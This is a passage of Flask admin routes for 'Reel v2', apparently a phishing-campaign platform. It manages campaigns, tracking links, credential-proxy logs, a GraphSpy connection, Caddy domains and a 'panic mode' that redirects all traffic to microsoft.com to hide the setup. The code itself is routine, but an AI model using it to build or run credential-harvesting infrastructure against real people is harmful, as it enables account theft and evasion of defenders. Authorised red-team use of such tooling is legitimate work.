            if campaign.caddy_config_id:
                try:
                    # Mark non-active so _build_servers_from_db excludes it
                    campaign.status = 'completed'
                    caddy_manager.remove_campaign_config(campaign.uid)
                    logger.info(f"Removed Caddy configuration for campaign {campaign.uid}")
                except Exception as e:
                    logger.warning(f"Failed to remove Caddy config for campaign {campaign.uid}: {e}")
            try:
                caddy_manager.cleanup_campaign_files(campaign.uid)
                logger.info(f"Cleaned up files for campaign {campaign.uid}")
            except Exception as e:
                logger.warning(f"Failed to cleanup campaign files for {campaign.uid}: {e}")

        # Delete associated events and tracked users (cascade should handle this)
        db.session.delete(campaign)
        db.session.commit()
        
        logger.info(f"Campaign '{campaign_name}' deleted by user {current_user.username}")
        
        return jsonify({
            'success': True,
            'message': f'Campaign "{campaign_name}" deleted successfully'
        })
        
    except Exception as e:
        db.session.rollback()
        logger.exception(f"Error deleting campaign {campaign_id}")
        return jsonify({'success': False, 'error': f'Error deleting campaign: {str(e)}'})

@admin_bp.route('/templates/api')
@login_required
def api_templates():
    """API endpoint to get templates: public templates plus the current user's own."""
    try:
        templates = Template.query.filter(
            db.or_(
                Template.is_public == True,
                Template.created_by_id == current_user.id,
            )
        ).order_by(Template.updated_at.desc()).all()
        return jsonify({
            'success': True,
            'templates': [template.to_dict(include_content=False) for template in templates]
        })
    except Exception as e:
        logger.exception("Error loading templates")
        return jsonify({'success': False, 'error': f'Error loading templates: {str(e)}'})

@admin_bp.route('/templates/api/<int:template_id>')
@login_required
def api_template_detail(template_id):
    """API endpoint to get a single template with variables"""
    try:
        template = Template.query.get_or_404(template_id)
        return jsonify({
            'success': True,
            'template': template.to_dict(include_content=True)
        })
    except Exception as e:
        logger.exception(f"Error loading template {template_id}")
        return jsonify({'success': False, 'error': f'Error loading template: {str(e)}'})

# Tracking management routes
@admin_bp.route('/campaigns/<int:campaign_id>/tracking')
@login_required
def campaign_tracking(campaign_id):
    """Campaign tracking dashboard"""
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        return render_template('campaign_tracking.html', campaign=campaign)
    except Exception as e:
        logger.exception(f"Error loading tracking dashboard for campaign {campaign_id}")
        flash(f'Error loading tracking dashboard: {e}', 'error')
        return redirect(url_for('admin.campaigns'))

@admin_bp.route('/campaigns/<int:campaign_id>/tracking/users')
@login_required
def tracking_users(campaign_id):
    """Manage tracked users for campaign"""
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        return render_template('tracking_users.html', campaign=campaign)
    except Exception as e:
        logger.exception(f"Error loading tracking users for campaign {campaign_id}")
        flash(f'Error loading tracking users: {e}', 'error')
        return redirect(url_for('admin.campaign_tracking', campaign_id=campaign_id))

@admin_bp.route('/campaigns/<int:campaign_id>/tracking/links')
@login_required
def tracking_links(campaign_id):
    """Generate tracking links for campaign"""
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        return render_template('tracking_links.html', campaign=campaign)
    except Exception as e:
        logger.exception(f"Error loading tracking links for campaign {campaign_id}")
        flash(f'Error loading tracking links: {e}', 'error')
        return redirect(url_for('admin.campaign_tracking', campaign_id=campaign_id))

@admin_bp.route('/campaigns/<int:campaign_id>/tracking/events')
@login_required
def tracking_events(campaign_id):
    """View tracking events for campaign"""
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        return render_template('tracking_events.html', campaign=campaign)
    except Exception as e:
        logger.exception(f"Error loading tracking events for campaign {campaign_id}")
        flash(f'Error loading tracking events: {e}', 'error')
        return redirect(url_for('admin.campaign_tracking', campaign_id=campaign_id))


@admin_bp.route('/campaigns/<int:campaign_id>/credential-proxy')
@login_required
def campaign_credential_proxy(campaign_id):
    """Credential proxy logs for a campaign"""
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        return render_template('credential_proxy_logs.html', campaign=campaign)
    except Exception as e:
        logger.exception(f"Error loading credential proxy logs for campaign {campaign_id}")
        flash(f'Error loading credential proxy logs: {e}', 'error')
        return redirect(url_for('admin.campaign_detail', campaign_id=campaign_id))


@admin_bp.route('/credential-proxy')
@login_required
def credential_proxy_logs():
    """Credential proxy logs (all jobs, top-level)"""
    return render_template('credential_proxy_logs.html', campaign=None)


@admin_bp.route('/templates')
@login_required
def templates():
    """Template management page"""
    return render_template('templates.html')

@admin_bp.route('/plugins')
@login_required
def plugins():
    """Plugin management page"""
    try:
        plugin_service = PluginService()
        plugins_list = plugin_service.list_plugins(active_only=False)
        return render_template('plugins.html', plugins=plugins_list)
    except Exception as e:
        logger.exception("Error loading plugins page")
        flash(f'Error loading plugins: {e}', 'error')
        return render_template('plugins.html', plugins=[])

@admin_bp.route('/mms-templates')
@login_required
def mms_templates():
    """MMS Card Templates management page"""
    return render_template('mms_templates.html')

@admin_bp.route('/settings')
@login_required
def settings():
    """Settings page - Database-driven configuration management"""
    return render_template('settings.html')

# Settings API endpoints
@admin_bp.route('/api/settings/directories')
@login_required
def api_directories_status():
    """Check if required directories exist"""
    from shared.config import Config
    import os
    
    return jsonify({
        'upload_folder': os.path.exists(Config.UPLOAD_FOLDER),
        'templates_folder': os.path.exists(Config.TEMPLATES_FOLDER),
        'assets_folder': os.path.exists(Config.ASSETS_FOLDER),
        'caddy_storage': os.path.exists(Config.CADDY_STORAGE_BASE)
    })

@admin_bp.route('/api/settings/ssl-certificates')
@login_required  
def api_ssl_certificates_count():
    """Get count of SSL certificates"""
    try:
        count = 0
        campaigns_with_ssl = Campaign.query.filter(
            Campaign.ssl_cert_path.isnot(None)
        ).count()
        return jsonify({'count': campaigns_with_ssl})
    except Exception as e:
        logger.exception("Error counting SSL certificates")
        return jsonify({'count': 0, 'error': str(e)})

@admin_bp.route('/api/settings/test-graphspy')
@login_required
def api_test_graphspy():
    """Test GraphSpy connection"""
    from shared.config import Config
    import requests
    
    try:
        response = requests.get(f"{Config.GRAPHSPY_URL}/health", timeout=10)
        if response.status_code == 200:
            return jsonify({
                'success': True,
                'status': 'Connected',
                'response_time': response.elapsed.total_seconds()
            })
        else:
            return jsonify({
                'success': False,
                'error': f'HTTP {response.status_code}'
            })
    except requests.RequestException as e:
        return jsonify({
            'success': False,
            'error': str(e)
        })

@admin_bp.route('/api/settings/export')
@login_required
def api_export_config():
    """Export configuration as JSON"""
    from shared.config import Config
    import json
    
    config_dict = {}
    for attr in dir(Config):
        if not attr.startswith('_') and not callable(getattr(Config, attr)):
            value = getattr(Config, attr)
            # Convert Path objects to strings
            if hasattr(value, '__fspath__'):
                value = str(value)
            config_dict[attr] = value
    
    config_json = json.dumps(config_dict, indent=2, default=str)
    
    return Response(
        config_json,
        mimetype='application/json',
        headers={'Content-Disposition': 'attachment; filename=reel_v2_config.json'}
    )

@admin_bp.route('/api/settings/generate-caddyfile')
@login_required
def api_generate_caddyfile():
    """Generate a basic Caddyfile template"""
    from shared.config import Config
    from urllib.parse import urlparse
    
    # Parse CADDY_API_URL to extract host and port
    config = Config()
    api_url = config.CADDY_API_URL
    parsed = urlparse(api_url)
    admin_host = parsed.hostname or 'localhost'
    admin_port = parsed.port or 2019
    
    caddyfile_content = f"""# Reel v2 Caddy Configuration
# Generated: {datetime.utcnow().isoformat()}

# Global options
{{
    admin {admin_host}:{admin_port}
    log {{
        level {config.CADDY_LOG_LEVEL}
    }}
    
    # Enable staging for Let's Encrypt if configured
    {"acme_ca https://acme-staging-v02.api.letsencrypt.org/directory" if config.CADDY_ENABLE_STAGING else ""}
    {"email " + config.CADDY_EMAIL if config.CADDY_EMAIL else "# email not configured"}
}}

# Default site
{config.CADDY_DEFAULT_DOMAIN} {{
    respond "Reel v2 - No campaign active"
}}

# Campaign configurations will be added dynamically via API
# This is a base template - active campaigns will be managed automatically
"""
    
    return Response(
        caddyfile_content.strip(),
        mimetype='text/plain',
        headers={'Content-Disposition': 'attachment; filename=Caddyfile'}
    )

@admin_bp.route('/workflows')
@login_required
def workflows():
    """Workflow management page"""
    return render_template('workflows.html')

@admin_bp.route('/caddy/config')
@login_required
def caddy_config():
    """Caddy configuration management page"""
    from shared.caddy import caddy_manager
    
    # Only allow admin users
    if not current_user.is_admin:
        flash('Access denied. Admin privileges required.', 'error')
        return redirect(url_for('admin.campaigns'))
    
    # Get current config and panic status
    config_result = caddy_manager.get_current_config()
    panic_status = caddy_manager.get_panic_status()
    
    return render_template('caddy_config.html',
                         config_result=config_result,
                         panic_status=panic_status)

@admin_bp.route('/caddy/config/raw')
@login_required
def caddy_config_raw():
    """Get raw Caddy configuration as JSON"""
    from shared.caddy import caddy_manager
    
    # Only allow admin users
    if not current_user.is_admin:
        return jsonify({'error': 'Access denied'}), 403
    
    result = caddy_manager.get_current_config()
    if result['success']:
        return jsonify(result['config']), 200
    else:
        return jsonify({'error': result['error']}), 500

@admin_bp.route('/caddy/panic', methods=['POST'])
@login_required
def caddy_panic_enable():
    """Enable panic mode - redirect all traffic to microsoft.com"""
    from shared.caddy import caddy_manager
    
    # Only allow admin users
    if not current_user.is_admin:
        return jsonify({'error': 'Access denied'}), 403
    
    result = caddy_manager.enable_panic_mode()
    if result['success']:
        logger.warning(f"PANIC MODE ENABLED by user {current_user.username}")
        return jsonify({'success': True, 'message': 'Panic mode enabled'}), 200
    else:
        return jsonify({'success': False, 'error': result['error']}), 500

@admin_bp.route('/caddy/panic/disable', methods=['POST'])
@login_required
def caddy_panic_disable():
    """Disable panic mode - restore original configuration"""
    from shared.caddy import caddy_manager
    
    # Only allow admin users
    if not current_user.is_admin:
        return jsonify({'error': 'Access denied'}), 403
    
    result = caddy_manager.disable_panic_mode()
    if result['success']:
        logger.info(f"Panic mode disabled by user {current_user.username}")
        return jsonify({'success': True, 'message': 'Panic mode disabled'}), 200
    else:
        return jsonify({'success': False, 'error': result['error']}), 500

@admin_bp.route('/workflows/new')
@login_required
def new_workflow():
    """New workflow builder page"""
    workflow_type = request.args.get('type', 'campaign')
    return render_template('workflow_builder.html', workflow=None, workflow_type=workflow_type)

@admin_bp.route('/workflows/<int:workflow_id>')
@login_required
def workflow_detail(workflow_id):
    """Workflow detail/builder page"""
    try:
        from shared.database import Workflow
        workflow = Workflow.query.get_or_404(workflow_id)
        return render_template('workflow_builder.html', workflow=workflow, workflow_type=workflow.workflow_type)
    except Exception as e:
        logger.exception(f"Error loading workflow {workflow_id}")
        flash(f'Error loading workflow: {e}', 'error')
        return redirect(url_for('admin.workflows'))

@admin_bp.route('/sending-workflows')
@login_required
def sending_workflows():
    """Redirect to workflows list (campaign-centric flow; no /sending-workflows in UX)."""
    return redirect(url_for('admin.workflows'))

@admin_bp.route('/sending-workflows/new')
@login_required
def new_sending_workflow():
    """New sending workflow: redirect to workflow builder."""
    return redirect(url_for('admin.new_workflow', type='sending'))

@admin_bp.route('/sending-workflows/<int:workflow_id>')
@login_required
def sending_workflow_detail(workflow_id):
    """Sending workflow detail page"""
    try:
        from shared.database import SendingWorkflow
        workflow = SendingWorkflow.query.get_or_404(workflow_id)
        return render_template('sending_workflow_detail.html', sending_workflow=workflow)
    except Exception as e:
        logger.exception(f"Error loading sending workflow {workflow_id}")
        flash(f'Error loading sending workflow: {e}', 'error')
        return redirect(url_for('admin.sending_workflows'))

@admin_bp.route('/sending-workflows/<int:workflow_id>/edit')
@login_required
def edit_sending_workflow(workflow_id):
    """Edit sending workflow page"""
    try:
        from shared.database import SendingWorkflow
        workflow = SendingWorkflow.query.get_or_404(workflow_id)
        return render_template('sending_workflow_form.html', sending_workflow=workflow)
    except Exception as e:
        logger.exception(f"Error loading sending workflow {workflow_id}")
        flash(f'Error loading sending workflow: {e}', 'error')
        return redirect(url_for('admin.sending_workflows'))

@admin_bp.route('/favicon.ico')
def favicon():
    """Serve blue fish favicon for admin panel"""
    # Create a minimal working favicon using data URI
    # This creates a simple blue square with "R" for "Reel"
    svg_content = '''<?xml version="1.0" encoding="UTF-8"?>
<svg width="16" height="16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
  <rect width="16" height="16" fill="#2563eb"/>
  <text x="8" y="12" font-family="Arial" font-size="12" font-weight="bold" text-anchor="middle" fill="white">R</text>
</svg>'''
    
    return Response(svg_content, mimetype='image/svg+xml')
